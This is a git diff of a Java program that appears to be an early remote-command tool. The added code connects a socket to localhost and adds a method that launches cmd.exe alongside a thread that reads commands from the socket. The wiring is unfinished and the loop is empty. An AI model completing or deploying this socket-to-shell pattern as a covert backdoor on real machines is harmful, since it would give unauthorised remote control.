@@ -4,6 +4,7 @@ import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
 import java.net.Socket;
 import java.net.SocketException;
 import java.util.concurrent.TimeUnit;
@@ -13,9 +14,36 @@ public static final String VERSION_NUM = "0.01";
 public static void main(String args[]) throws Exception {
         // listen();
         // doMyBidding("127.0.0.1", 2000);
-        clientRunner();
+        // clientRunner();
+    Socket socket = new Socket("localhost", 50000);
+    BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+    PrintWriter writer = new PrintWriter(socket.getOutputStream());
+
     
 }
+
+public static void createThread(BufferedReader reader) throws IOException{
+    String cmd = "";
+    String reply = "";
+    ProcessBuilder pb = new ProcessBuilder();
+    pb.command("cmd.exe", "/K");
+    pb.redirectErrorStream(true);
+    Process shell = pb.start();
+    pb.command("cmd.exe", "/K");
+    pb.redirectErrorStream(true);
+    new Thread(() -> {
+
+        try {
+            String line;
+            while ((line = reader.readLine()) != null) {
+
+            }
+        } catch (IOException e) {
+            System.out.println("Connection Closed.");
+        }
+    }).start();
+}
+
 
 public static void clientRunner() throws Exception {
     String userIn = "";
